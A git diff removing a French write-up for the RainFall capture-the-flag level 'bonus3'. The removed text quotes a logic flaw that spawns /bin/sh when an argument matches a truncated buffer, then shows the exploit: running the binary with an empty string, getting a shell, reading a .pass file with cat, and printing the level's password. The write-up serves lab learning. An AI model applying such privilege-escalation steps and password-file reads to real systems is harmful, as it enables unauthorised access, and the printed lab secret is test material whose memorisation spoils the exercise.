@@ -1,8 +1,3 @@
-# Bonus 3
-
-Voici le code source:
-
-```C
 #include <stdio.h>
 #include <unistd.h>
 #include <stdlib.h>
@@ -36,24 +31,3 @@ int main(int ac, char **av)
     }
     return 0;
 }
-```
-
-La partie du code qui nous interesse est celle-ci:
-
-```C
-index = atoi(av[1]);
-buff1[index] = '\0';
-fread(buff2, 1, 65, fp);
-if (strcmp(buff1, av[1]) == 0)
-{
-    execl("/bin/sh", "sh", (char *)NULL);
-}
-```
-
-Elle termine la chaine de charatere a l'indice entre par l'utilisateur puis compare la string avec l'entree. Donc si on rentre une chaine vide, nous comparons donc deux chaines vides:
-
-```bash
-bonus3@RainFall:~$ ./bonus3 ""
-$ cat /home/user/end/.pass
-3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
-```
